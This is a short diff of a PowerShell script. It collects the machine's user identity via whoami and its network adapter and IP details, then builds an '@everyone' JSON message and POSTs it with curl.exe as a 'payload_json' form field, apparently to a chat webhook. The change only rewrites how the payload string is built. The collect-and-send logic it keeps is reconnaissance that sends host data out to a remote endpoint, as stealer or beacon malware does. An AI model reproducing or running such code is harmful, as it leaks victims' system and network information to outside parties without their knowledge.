@@ -35,9 +35,8 @@ $networkInfo = (Get-NetAdapter | ForEach-Object { $a=$_; $ips=Get-NetIPAddress -
 
 
 $whoami_content = whoami
-$payload = @{
-    content = "@everyone: $whoami_content | $networkInfo"
-} | ConvertTo-Json -Compress
+$payload = "{`\"content`\":`\"@everyone: $whoami_content | $networkInfo`\"}"
+
 
 curl.exe -X POST `
   -F "payload_json=$payload" `
